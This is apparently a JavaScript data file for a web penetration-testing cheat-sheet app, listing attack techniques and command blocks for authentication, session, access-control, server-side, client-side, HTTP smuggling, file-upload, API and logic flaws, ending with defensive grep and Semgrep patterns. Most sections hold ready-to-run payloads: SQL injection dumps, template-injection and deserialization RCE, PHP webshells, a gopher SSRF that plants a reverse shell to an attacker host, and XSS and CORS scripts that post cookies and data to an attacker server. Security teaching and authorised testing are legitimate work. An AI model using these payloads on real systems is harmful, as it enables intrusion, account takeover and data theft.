import React from 'react';
import TechniqueCard from '../TechniqueCard';

const techniques = [
  {
    id: 'authentication',
    title: 'Authentication Attacks',
    subtitle: 'Attacking authentication mechanisms — brute force, credential stuffing, JWT, MFA bypass',
    tags: ['brute force', 'credential stuffing', 'default creds', 'password reset', 'MFA bypass', 'JWT'],
    steps: [
      'Enumerate valid usernames via registration, login error messages, or response timing differences',
      'Test for default credentials on admin panels, APIs, and management interfaces',
      'Attempt password brute force / credential stuffing with rate limit bypass techniques',
      'Test password reset functionality for token leakage, host header injection, or predictable tokens',
      'Check for MFA bypass: lack of rate limiting on OTP, MFA not enforced on all endpoints, session fixation after MFA',
      'Test for authentication bypass via parameter manipulation, forced browsing, or JWT manipulation',
      'Test OAuth flows for open redirects, CSRF on authorization endpoint, token leakage in Referer header',
      'Check for account takeover via username/email case manipulation (user@corp.com vs USER@corp.com)',
    ],
    commands: [
      {
        title: 'Username enumeration & brute force',
        code: `# Username enumeration via response differences
ffuf -w /usr/share/seclists/Usernames/Names/names.txt -u https://target.com/login -X POST \\
  -d "username=FUZZ&password=test" -H "Content-Type: application/x-www-form-urlencoded" \\
  -mr "Invalid password"

# Credential stuffing with hydra
hydra -L users.txt -P passwords.txt target.com http-post-form \\
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Rate limit bypass — X-Forwarded-For rotation
ffuf -w passwords.txt:PASS -w ips.txt:IP \\
  -u https://target.com/login -X POST \\
  -d "username=admin&password=PASS" \\
  -H "X-Forwarded-For: IP"

# Password reset host header injection
# Change Host header to attacker.com — reset link sent to victim contains attacker domain
curl -X POST https://target.com/reset-password \\
  -H "Host: attacker.com" \\
  -d "email=victim@target.com"`
      },
      {
        title: 'JWT attacks',
        code: `# Decode JWT
echo "<JWT_TOKEN>" | cut -d. -f2 | base64 -d 2>/dev/null | jq

# None algorithm attack
python3 jwt_tool.py <JWT> -X a

# Key confusion (RS256 -> HS256 using public key as secret)
python3 jwt_tool.py <JWT> -X k -pk public.pem

# Brute force JWT secret
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Inject claims (after cracking/forging)
python3 jwt_tool.py <JWT> -I -pc role -pv admin -S hs256 -p 'secret'

# kid header injection (SQLi in kid field)
# Forge token with: {"kid": "' UNION SELECT 'secret'-- -"}
# Then sign with 'secret' as HMAC key`
      },
      {
        title: 'OAuth 2.0 attacks',
        code: `# Open redirect on redirect_uri
https://target.com/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://attacker.com/callback&   # Should be blocked
  response_type=code&scope=read

# CSRF on authorization endpoint (missing state parameter)
# Victim visits attacker page which triggers:
https://target.com/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  state=ATTACKER_CONTROLLED   # or missing entirely

# Token leakage via Referer — check if auth code appears in Referer header
# on subsequent requests after OAuth callback

# PKCE bypass — check if code_verifier is validated server-side
curl -X POST https://target.com/oauth/token \\
  -d "grant_type=authorization_code&code=CODE&redirect_uri=URI" \\
  # Omit code_verifier — if accepted, PKCE not enforced`
      }
    ]
  },
  {
    id: 'session-mgmt',
    title: 'Session Management',
    subtitle: 'Session fixation, CSRF, cookie flags, session invalidation weaknesses',
    tags: ['session fixation', 'cookie theft', 'CSRF', 'session hijacking', 'SameSite'],
    steps: [
      'Analyze session tokens for entropy, predictability, and proper randomness (collect 1000+ tokens)',
      'Test for session fixation by pre-setting session IDs before authentication',
      'Check cookie flags on all cookies: HttpOnly, Secure, SameSite, Path, Domain scope',
      'Test for Cross-Site Request Forgery (CSRF) on all state-changing operations',
      'Verify session invalidation on logout, password change, and concurrent login limits',
      'Test for session persistence after logout — cookie may still be valid server-side',
      'Check SameSite=None cookies for CSRF exposure across cross-site iframes/navigations',
    ],
    commands: [
      {
        title: 'Session analysis & CSRF',
        code: `# Collect session tokens and analyze entropy
for i in $(seq 1 100); do
  curl -s -c - https://target.com/login -X POST \\
    -d "user=test&pass=test" | grep -i "session\\|token"
done > tokens.txt

# Check token randomness
cat tokens.txt | sort | uniq -d    # Duplicates = predictable

# CSRF PoC — auto-submit form
<html><body>
  <form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>document.forms[0].submit();</script>
</body></html>

# CSRF with JSON (Content-Type bypass)
<form method="POST" enctype="text/plain" action="https://target.com/api/settings">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>

# Verify session fixation
# 1. Get pre-auth session: curl -c pre_session.txt https://target.com/login
# 2. Login with that session
# 3. Check if session ID changes after login (it should)
curl -b pre_session.txt -c post_session.txt https://target.com/login -X POST \\
  -d "user=victim&pass=password"
diff pre_session.txt post_session.txt`
      }
    ]
  },
  {
    id: 'authorization',
    title: 'Authorization & Access Control',
    subtitle: 'IDOR, privilege escalation, BOLA, missing function-level access controls',
    tags: ['IDOR', 'BOLA', 'privilege escalation', 'horizontal', 'vertical', 'mass assignment'],
    steps: [
      'Map all endpoints and identify access control mechanisms (RBAC, ABAC, ownership checks)',
      'Test for Insecure Direct Object References (IDOR/BOLA) by swapping IDs between accounts',
      'Attempt vertical privilege escalation: access admin-only endpoints as regular user',
      'Test horizontal privilege escalation: access another user\'s resources by changing IDs',
      'Check for missing function-level access controls on hidden or undocumented API endpoints',
      'Test for mass assignment: send unexpected fields (role, isAdmin, balance) in PUT/PATCH requests',
      'Test GraphQL for introspection, batch queries, field-level authorization bypass',
    ],
    commands: [
      {
        title: 'IDOR & access control testing',
        code: `# IDOR — iterate user IDs with two accounts
# Account A token: TOKEN_A, Account B ID: 1234
for i in $(seq 1 500); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \\
    -H "Authorization: Bearer TOKEN_A" \\
    "https://target.com/api/users/$i/profile")
  [ "$code" = "200" ] && echo "Accessible: /api/users/$i"
done

# Mass assignment — add role/admin fields to profile update
curl -X PUT https://target.com/api/user/profile \\
  -H "Authorization: Bearer TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{"name":"test","email":"test@test.com","role":"admin","isAdmin":true}'

# Forced browsing admin endpoints as regular user
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \\
  -u https://target.com/admin/FUZZ \\
  -H "Cookie: session=REGULAR_USER_SESSION" -mc 200,301,302

# HTTP verb tampering — bypass access controls
curl -X HEAD https://target.com/admin/delete-user  # HEAD instead of GET
curl -X FUZZ https://target.com/admin/endpoint     # Try PUT/PATCH/OPTIONS`
      },
      {
        title: 'GraphQL authorization bypass',
        code: `# Enable introspection (often left on in dev/staging)
curl -X POST https://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Batch query abuse — bypass rate limiting
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  ...100 queries...
]

# Field suggestion — enumerate hidden fields
{"query": "{ user { admi } }"}   # Server suggests: "Did you mean admin?"

# Bypass field-level auth — access fields on nested objects
{"query": "{ post(id: 1) { author { email passwordHash } } }"}`
      }
    ]
  },
  {
    id: 'server-side',
    title: 'Server-Side Attacks',
    subtitle: 'SQLi, RCE, SSRF, LFI, SSTI, XXE, deserialization — full server-side exploitation',
    tags: ['SQLi', 'RCE', 'SSRF', 'LFI', 'SSTI', 'XXE', 'deserialization', 'OGNL'],
    steps: [
      'Test all input parameters for SQL injection (error-based, blind boolean, time-based, UNION)',
      'Test for OS command injection via metacharacters (;, |, &&, ||, $(), backticks)',
      'Test for SSRF by injecting internal URLs — target cloud metadata endpoints (169.254.169.254)',
      'Test for LFI/path traversal with ../../../etc/passwd and URL/double encoding variants',
      'Test for Server-Side Template Injection (SSTI) — inject {{7*7}}, ${7*7}, #{7*7}',
      'Test XML/SOAP endpoints for XXE injection with SYSTEM entity declarations',
      'Test serialized object parameters for insecure deserialization (Java, PHP, .NET)',
      'Test for OGNL injection in Struts, Spring Expression Language (SpEL) injection',
    ],
    commands: [
      {
        title: 'SQL injection',
        code: `# SQLMap — automated testing
sqlmap -u "https://target.com/search?q=test" --batch --dbs --risk=3 --level=5
sqlmap -u "https://target.com/search?q=test" -D database -T users --dump
# POST request
sqlmap -u "https://target.com/login" --data="user=test&pass=test" --batch --dbs
# With session cookie
sqlmap -u "https://target.com/profile" --cookie="session=COOKIE" --batch

# Manual UNION detection
' ORDER BY 1--          # Increment until error to find column count
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# UNION data extraction
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -

# Blind boolean-based
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -

# Time-based blind
' AND IF(1=1,SLEEP(5),0)-- -
'; WAITFOR DELAY '0:0:5'--     # MSSQL`
      },
      {
        title: 'SSRF & LFI',
        code: `# SSRF — cloud metadata
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Azure
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# GCP
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# SSRF filter bypass
http://127.0.0.1 → http://0x7f000001 → http://2130706433 → http://0177.0.0.1 → http://[::1]
http://127.1 → http://127.0.1 → http://0/
# DNS rebinding — register domain that resolves to 127.0.0.1 on second lookup

# Gopher SSRF → internal Redis/Memcache RCE
curl "https://target.com/fetch?url=gopher://127.0.0.1:6379/_SET%20shell%20%22%5Cn*/1%20*%20*%20*%20*%20bash%20-i%20%3E%26%20/dev/tcp/ATTACKER/443%200%3E%261%5Cn%22"

# LFI — path traversal
curl "https://target.com/file?path=../../../../etc/passwd"
# URL encoded
curl "https://target.com/file?path=%2F%2F%2F%2F..%2F..%2Fetc%2Fpasswd"
# Double encoded
curl "https://target.com/file?path=%252F%252F..%252F..%252Fetc%252Fpasswd"
# Null byte (PHP < 5.3)
curl "https://target.com/file?path=../../../../etc/passwd%00.txt"
# PHP wrappers
curl "https://target.com/file?path=php://filter/convert.base64-encode/resource=/etc/passwd"
curl "https://target.com/file?path=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"

# Log poisoning → RCE via LFI
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" https://target.com/
curl "https://target.com/file?path=../../../../var/log/apache2/access.log&cmd=id"`
      },
      {
        title: 'SSTI, XXE & deserialization',
        code: `# SSTI detection — test all template engines
{{7*7}}         # Jinja2, Twig → 49
\${7*7}          # Freemarker, Thymeleaf, EL → 49
#{7*7}          # Thymeleaf
<%= 7*7 %>      # ERB (Ruby)
{{7*'7'}}       # Jinja2 → '7777777', Twig → 49

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
# Sandbox bypass
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen('id').read()}}
  {% endif %}
{% endfor %}

# Freemarker RCE
\${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>\${ ex("id")}

# XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

# XXE Out-of-Band
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]>
# evil.dtd: <!ENTITY % data SYSTEM "file:///etc/passwd">
#           <!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER/?d=%data;'>">
#           %exfil; %send;

# Java deserialization (ysoserial)
java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER/$(whoami)' | base64 -w0
# PHP deserialization — magic method chain (POP chain)
O:4:"User":1:{s:4:"name";s:4:"test";}
# .NET deserialization (ysoserial.net)
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping ATTACKER"`
      }
    ]
  },
  {
    id: 'client-side',
    title: 'Client-Side Attacks',
    subtitle: 'XSS, DOM manipulation, CORS, CSP bypass, prototype pollution, clickjacking',
    tags: ['XSS', 'DOM XSS', 'CORS', 'CSP bypass', 'clickjacking', 'prototype pollution', 'PostMessage'],
    steps: [
      'Test all input reflection points for XSS (reflected, stored, DOM-based)',
      'Check CORS configuration for wildcard origins or credential sharing with untrusted origins',
      'Test CSP for bypass via allowed script-src sources, unsafe-inline, unsafe-eval, base-uri',
      'Test for clickjacking via missing X-Frame-Options or frame-ancestors CSP',
      'Test for prototype pollution in JS-heavy apps (merge, extend, set functions)',
      'Test postMessage handlers for origin validation and dangerous sink usage',
      'Test for DOM clobbering — inject HTML that overwrites JS globals',
      'Check for web cache deception — request static-looking URLs that serve authenticated content',
    ],
    commands: [
      {
        title: 'XSS payload arsenal',
        code: `# Reflected XSS
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>

# Filter bypass payloads
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
" onmouseover="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%;
javascript:alert(1)     # In href= context

# DOM XSS sinks to monitor
document.write(), document.writeln()
element.innerHTML, element.outerHTML
location.href, location.assign(), location.replace()
eval(), setTimeout(), setInterval(), Function()
element.src, element.action

# Stored XSS — cookie stealer + keylogger
<script>
fetch('https://ATTACKER/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    url: location.href
  })
})
</script>

# CSP bypass — if 'unsafe-eval' or jsonp endpoint in allowed origins
<script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>
# If base-uri not set — base tag injection
<base href="https://ATTACKER/">
<script src="/app.js"></script>   # Loads from attacker.com/app.js`
      },
      {
        title: 'CORS & prototype pollution',
        code: `# CORS misconfiguration test
curl -s -H "Origin: https://evil.com" https://target.com/api/me -I | grep -i "access-control"
# Look for: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true

# CORS exploit
<script>
fetch('https://target.com/api/sensitive', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://ATTACKER/exfil', {
    method: 'POST', body: JSON.stringify(d)
  }))
</script>

# Prototype pollution — test via URL params
https://target.com/?__proto__[isAdmin]=true
https://target.com/?constructor[prototype][isAdmin]=true

# Test in dev console
Object.prototype.isAdmin   # Should be undefined — if "true", polluted

# Prototype pollution → RCE in server-side Node.js (lodash.merge)
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('curl ATTACKER/$(id)');x"}}

# postMessage — misconfigured origin check
# Test: send message from unintended origin
window.postMessage({type:'navigate', url:'javascript:alert(1)'}, '*')
# Look for: if(event.origin !== 'trusted.com') — can be bypassed with: trustedcom.evil.com`
      }
    ]
  },
  {
    id: 'http-attacks',
    title: 'HTTP Protocol Attacks',
    subtitle: 'Request smuggling, cache poisoning, host header injection, HTTP/2 downgrade attacks',
    tags: ['HTTP smuggling', 'cache poisoning', 'host header injection', 'CL.TE', 'TE.CL', 'desync'],
    steps: [
      'Test for HTTP request smuggling — CL.TE (frontend uses Content-Length, backend uses Transfer-Encoding)',
      'Test for TE.CL variant — frontend uses Transfer-Encoding, backend uses Content-Length',
      'Use HTTP request smuggling to bypass front-end security controls, poison request queues',
      'Test for web cache poisoning — inject unkeyed headers (X-Forwarded-Host, X-Forwarded-Scheme) into cached responses',
      'Test for Host header attacks — password reset poisoning, SSRF via Host header, virtual host routing bypass',
      'Test HTTP/2 downgrade paths — H2.CL, H2.TE smuggling via HTTP/2-to-HTTP/1 translation',
      'Test for response splitting via CRLF injection in redirect URLs or header values',
    ],
    commands: [
      {
        title: 'HTTP request smuggling (CL.TE / TE.CL)',
        code: `# CL.TE smuggling — frontend trusts Content-Length, backend trusts Transfer-Encoding
# The "G" prefix is smuggled to the next request — turns it into "GPOST /"
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G

# TE.CL smuggling — frontend uses TE, backend uses CL
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


# Confirm smuggling — timing test (CL.TE)
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X    # Backend waits for more data → 10s+ delay = vulnerable

# Exploit CL.TE — capture next victim's request
POST / HTTP/1.1
Host: target.com
Content-Length: 129
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

data=   # Next victim's request appended here → logged to /capture

# Tool: smuggler.py
python3 smuggler.py -u https://target.com/ -v 2`
      },
      {
        title: 'Web cache poisoning',
        code: `# Detect unkeyed headers — inject poison and check if cached
curl -s -H "X-Forwarded-Host: attacker.com" https://target.com/ | grep "attacker.com"
curl -s -H "X-Forwarded-Scheme: http" https://target.com/ | grep "http://"

# Poison cache with XSS via unkeyed header
# If X-Forwarded-Host is reflected in JS resource URL:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>
# If cached, served to all subsequent visitors

# Cache key manipulation — add fat GET body
GET / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

param=value   # Ignored by cache key, but processed by backend

# Param cloaking (cache sees ?x=1, backend sees ?x=1&x=injected)
GET /?x=1;x=poisoned HTTP/1.1   # Some parsers split on ;
# Cache key: ?x=1  → serves cached poisoned response to clean requests

# Web cache deception
# Victim visits: https://target.com/api/profile/nonexistent.css
# Cache caches the authenticated response, attacker retrieves it
curl https://target.com/api/profile/nonexistent.css`
      },
      {
        title: 'CRLF injection & host header attacks',
        code: `# CRLF injection — inject response headers
https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20admin=true

# CRLF → XSS via injected Content-Type
curl "https://target.com/redirect?url=/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"

# Host header — password reset poisoning
POST /reset-password HTTP/1.1
Host: attacker.com          # Injected — reset link uses this domain
X-Forwarded-Host: attacker.com

email=victim@target.com
# Victim receives: "Click here: https://attacker.com/reset?token=..."

# Absolute URL routing — internal hostname disclosure
GET http://internal-backend.local/ HTTP/1.1
Host: target.com

# HTTP/2 pseudo-header injection
:authority: target.com\r\nX-Injected: value
# Some HTTP/2 → HTTP/1.1 translation proxies don't strip injected headers`
      }
    ]
  },
  {
    id: 'file-upload',
    title: 'File Upload Attacks',
    subtitle: 'Bypass upload filters to achieve RCE, path traversal, XXE, or SSRF via files',
    tags: ['webshell', 'MIME bypass', 'extension bypass', 'ImageMagick', 'path traversal', 'polyglot'],
    steps: [
      'Map upload functionality — identify allowed file types, storage location, and processing pipeline',
      'Test extension bypass: double extensions (.php.jpg), null bytes (.php%00.jpg), alternative extensions (.php5, .phtml)',
      'Bypass content-type checks by setting legitimate MIME type with malicious content',
      'Test for path traversal in filename: ../../../../var/www/html/shell.php',
      'Upload SVG with embedded XSS or XXE for client-side/server-side attacks',
      'Test ImageMagick processing for ImageTragick (CVE-2016-3714) via .mvg/.svg payloads',
      'Create polyglot files: valid image headers + PHP code (exiftool-based)',
    ],
    commands: [
      {
        title: 'File upload bypass & webshell',
        code: `# Extension bypass techniques
file.php.jpg         # Double extension — Apache may execute
file.php%00.jpg      # Null byte — PHP < 5.3 strips at null
file.php7            # Less common but executable
file.phtml           # PHP alternative extension
file.pHp             # Case variation — case-insensitive servers
file.php::DATA       # NTFS alternate data stream (Windows IIS)

# Content-Type bypass — set image MIME, upload PHP
curl -X POST https://target.com/upload \\
  -F "file=@shell.php;type=image/jpeg"   # Override MIME

# Magic bytes bypass — prepend GIF header to PHP code
# Create file with: GIF89a<?php system($_GET['cmd']); ?>
printf 'GIF89a' > shell.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.php

# Path traversal in filename
curl -X POST https://target.com/upload \\
  -F "file=@shell.php" \\
  -F "filename=../../../../var/www/html/shell.php"

# SVG XSS
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">alert(document.domain);</script>
</svg>

# SVG XXE (if SVG processed server-side)
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg><text>&xxe;</text></svg>

# ImageTragick — RCE via malicious .mvg file
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/"|curl http://ATTACKER/$(id)|")'
pop graphic-context`
      }
    ]
  },
  {
    id: 'api-security',
    title: 'API Security Testing',
    subtitle: 'REST API, GraphQL, and microservice attack patterns — enumeration, injection, abuse',
    tags: ['REST', 'GraphQL', 'IDOR', 'mass assignment', 'rate limiting', 'API versioning', 'BOLA'],
    steps: [
      'Enumerate API endpoints via Swagger/OpenAPI docs, JavaScript source analysis, and directory fuzzing',
      'Test all API versions — older versions (v1, v2) often lack security controls present in current version',
      'Test for BOLA (Broken Object Level Authorization) — swap object IDs across accounts',
      'Test for BFLA (Broken Function Level Authorization) — call admin endpoints as regular user',
      'Check for mass assignment vulnerabilities — send extra fields in API requests',
      'Test rate limiting on authentication and sensitive operations (brute force, enumeration)',
      'Test for API key leakage in JavaScript bundles, GitHub, mobile apps (strings/jadx)',
    ],
    commands: [
      {
        title: 'API reconnaissance & testing',
        code: `# Discover API endpoints from JS files
# Extract all URLs from JS bundles
curl -s https://target.com/app.js | grep -Eo '(https?://[^"' + "']+|/api/[^"'" + '"]+)'
# Or use LinkFinder
python3 linkfinder.py -i https://target.com -d -o results.html

# Swagger/OpenAPI enumeration
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \\
  -u https://target.com/FUZZ -mc 200
# Common docs paths:
/swagger.json, /swagger/v1/swagger.json, /api-docs, /openapi.json
/v2/api-docs, /v3/api-docs, /swagger-ui.html, /.well-known/openapi

# Test older API versions
curl https://target.com/api/v1/admin/users    # Old version, no auth?
curl https://target.com/api/v2/admin/users
# Change version in path, header (Api-Version), or query param (?version=1)

# BOLA — swap IDs between accounts
curl -H "Authorization: Bearer ACCOUNT_A_TOKEN" \\
  https://target.com/api/orders/ORDER_B_ID    # Access B's order with A's token

# Find API keys in JS bundles
grep -r "apikey\|api_key\|authorization\|bearer\|secret\|token" \\
  --include="*.js" ./ -i | grep -v "//.*apikey"

# Rate limit testing — send 100 requests/second
seq 1 100 | xargs -P 100 -I {} curl -s -o /dev/null \\
  -w "%{http_code}\\n" https://target.com/api/login \\
  -X POST -d "user=test&pass=test{}"

# Regex DoS (ReDoS) — test complex inputs against regex-validated fields
python3 -c "print('a'*10000 + '!')" | curl -X POST https://target.com/api/register \\
  -d "email=$(cat)"  # Measure response time`
      }
    ]
  },
  {
    id: 'business-logic',
    title: 'Business Logic Flaws',
    subtitle: 'Race conditions, negative values, workflow bypass, price manipulation',
    tags: ['race condition', 'negative values', 'workflow bypass', 'price manipulation', 'TOCTOU'],
    steps: [
      'Map the intended business flow and identify assumptions the application makes about request order',
      'Test race conditions on coupon codes, gift cards, transfer operations (send parallel requests)',
      'Test negative values in purchase quantities, transfer amounts, or discount fields',
      'Test for workflow bypass — skip steps in multi-step processes (checkout without address)',
      'Replay discounts, referral codes, or promotional offers multiple times',
      'Test for integer overflow/underflow in balance calculations',
      'Test for TOCTOU (Time-of-Check to Time-of-Use) — check and act on different data states',
    ],
    commands: [
      {
        title: 'Race conditions & logic bypass',
        code: `# Race condition — parallel coupon redemption (Turbo Intruder / custom script)
# Burp Suite Turbo Intruder: send 20 simultaneous redemption requests
engine = RequestEngine(endpoint=target,
  concurrentConnections=20,
  requestsPerConnection=1,
  pipeline=False
)
for i in range(20):
  engine.queue(baseRequest, 'COUPON2025')

# Python — parallel race
import requests, threading

def redeem():
  r = requests.post('https://target.com/redeem',
    data={'code': 'DISCOUNT50'},
    headers={'Cookie': 'session=VICTIM_SESSION'})
  print(r.status_code, r.text[:50])

threads = [threading.Thread(target=redeem) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]

# Negative price — purchase with negative quantity
curl -X POST https://target.com/cart/add \\
  -d "product_id=123&quantity=-1&price=-99.99"

# Workflow bypass — skip payment step
# Step 1: Add to cart → Step 2: Checkout → Step 3: Payment → Step 4: Confirmation
# Skip to confirmation:
curl -b "session=SESSION" https://target.com/order/confirm \\
  -X POST -d "order_id=LATEST_ORDER_ID"

# Parameter pollution — send parameter twice
curl -X POST https://target.com/transfer \\
  -d "amount=1000&account=ATTACKER&amount=1"   # Which amount does server use?`
      }
    ]
  },
  {
    id: 'source-code-review',
    title: 'Source Code Review',
    subtitle: 'Static analysis patterns, dangerous function auditing, secrets discovery, SAST tooling',
    tags: ['SAST', 'grep patterns', 'secrets', 'dangerous functions', 'taint analysis', 'Semgrep'],
    steps: [
      'Identify attack surface: all external input points (request params, headers, file uploads, env vars)',
      'Trace data flow from input to dangerous sinks (SQL queries, OS commands, eval, file operations)',
      'Search for hardcoded secrets: API keys, passwords, private keys, connection strings',
      'Audit dependency versions for known CVEs — check package.json, requirements.txt, pom.xml',
      'Look for insecure cryptography: MD5/SHA1 for passwords, ECB mode, weak random, static IV',
      'Check for dangerous function usage: eval(), exec(), system(), unserialize(), pickle.loads()',
      'Run Semgrep with security rulesets for automated pattern matching',
      'Check for debug endpoints, commented-out admin routes, TODO/FIXME with security implications',
    ],
    commands: [
      {
        title: 'Grep patterns for vulnerabilities',
        code: `# Secrets / credentials
grep -rn "password\s*=\s*['\"]" --include="*.py" --include="*.js" --include="*.php" .
grep -rn "api_key\|apikey\|api-key\|secret_key\|SECRET" --include="*.env*" --include="*.config*" .
grep -rn "BEGIN RSA\|BEGIN PRIVATE\|BEGIN OPENSSH" .
grep -rn "AWS_ACCESS_KEY_ID\|AKIA[0-9A-Z]{16}" .
grep -rn "eyJ[a-zA-Z0-9_-]*\." .   # JWT tokens in code

# Dangerous functions — PHP
grep -rn "eval\s*(\|system\s*(\|exec\s*(\|shell_exec\s*(\|passthru\s*(" --include="*.php" .
grep -rn "unserialize\s*(\|\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE" --include="*.php" .
grep -rn "include\s*(\|require\s*(" --include="*.php" .   # LFI candidates
grep -rn "mysql_query\|mysqli_query\|PDO.*prepare" --include="*.php" .   # SQLi audit

# Dangerous functions — Python
grep -rn "eval\s*(\|exec\s*(\|os\.system\|subprocess\.call\|pickle\.loads" --include="*.py" .
grep -rn "render_template_string\|Markup(" --include="*.py" .   # SSTI in Flask
grep -rn "yaml\.load\s*(" --include="*.py" .   # Insecure YAML load

# Dangerous functions — JavaScript/Node.js
grep -rn "eval(\|Function(\|child_process\|execSync\|exec(" --include="*.js" .
grep -rn "innerHTML\s*=\|document\.write\|dangerouslySetInnerHTML" --include="*.js" .
grep -rn "\.query(\|knex\.raw\|sequelize\.query" --include="*.js" .   # SQLi in ORM

# Insecure crypto
grep -rn "md5\|sha1\|DES\|RC4\|ECB\|Math\.random\(\)" --include="*.py" --include="*.js" .
grep -rn "hashlib\.md5\|hashlib\.sha1" --include="*.py" .

# Debug / development artifacts
grep -rn "TODO.*auth\|FIXME.*security\|DEBUG.*True\|debug=True" .
grep -rn "127\.0\.0\.1\|localhost\|0\.0\.0\.0\|admin.*password\|test.*password" .`
      },
      {
        title: 'SAST tooling — Semgrep & others',
        code: `# Semgrep — run OWASP Top 10 rules
semgrep --config=p/owasp-top-ten .
semgrep --config=p/python .
semgrep --config=p/nodejs .
semgrep --config=p/php .
semgrep --config=p/java .
semgrep --config=p/secrets .          # Secret detection

# Specific Semgrep rules
semgrep --config=p/sql-injection .
semgrep --config=p/command-injection .
semgrep --config=p/xss .
semgrep --config=p/ssrf .

# Output formats
semgrep --config=p/owasp-top-ten --json -o results.json .
semgrep --config=p/owasp-top-ten --sarif -o results.sarif .

# Bandit — Python security linter
pip install bandit
bandit -r /path/to/project -f json -o bandit_results.json
bandit -r . -ll   # Show medium and high severity only

# NodeJsScan — Node.js SAST
nodejsscan -d /path/to/project -o results.json

# gosec — Go security scanner
gosec ./...

# Find dependency vulnerabilities
npm audit --json
pip-audit
safety check -r requirements.txt
trivy fs . --severity HIGH,CRITICAL

# Secret scanning
truffleHog git file://./  --json
gitleaks detect --source . -v`
      },
      {
        title: 'Taint analysis & code flow',
        code: `# Manual taint analysis — trace from source to sink

# SOURCES (user-controlled input):
# PHP: $_GET, $_POST, $_REQUEST, $_COOKIE, $_SERVER['HTTP_*'], file_get_contents('php://input')
# Python/Flask: request.args, request.form, request.json, request.headers
# Node.js: req.query, req.body, req.params, req.headers
# Java: request.getParameter(), request.getHeader(), request.getInputStream()

# SINKS (dangerous operations):
# SQL:      db.query(TAINTED), cursor.execute(TAINTED)
# OS Cmd:   os.system(TAINTED), exec(TAINTED), eval(TAINTED)
# File:     open(TAINTED), include(TAINTED), readFile(TAINTED)
# Redirect: response.redirect(TAINTED), header('Location: '+TAINTED)
# Reflect:  echo TAINTED, res.send(TAINTED), render(TAINTED) → XSS

# SANITIZERS (check if applied between source and sink):
# SQL: parameterized queries, prepared statements
# OS: shlex.quote(), escapeshellarg()
# HTML: htmlspecialchars(), DOMPurify.sanitize()
